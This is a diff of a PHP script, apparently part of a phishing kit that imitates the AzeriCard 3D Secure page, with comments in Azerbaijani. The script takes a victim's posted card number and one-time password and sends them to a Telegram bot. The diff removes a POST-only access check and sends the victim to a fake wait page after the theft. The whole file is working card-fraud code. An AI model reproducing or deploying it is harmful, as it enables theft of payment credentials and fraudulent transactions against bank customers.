@@ -1,10 +1,4 @@
 <?php
-// Tokenin oğurlanmasının qarşısını alan qoruma
-if (basename($_SERVER['PHP_SELF']) == '3ds.php' && $_SERVER['REQUEST_METHOD'] !== 'POST') {
-    http_response_code(403);
-    exit('Access Denied');
-}
-
 $otp = $_POST['otp'] ?? '';
 $card = $_POST['card'] ?? '';
 
@@ -15,5 +9,7 @@ $message = "3D Secure OTP:\nKart: $card\nOTP: $otp";
 $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
 @file_get_contents($url);
 
-echo "success";
+// OTP göndərildikdən sonra gözləmə səhifəsinə yönləndiririk
+header("Location: /azericard/wait.html?card=" . urlencode($card));
+exit();
 ?>
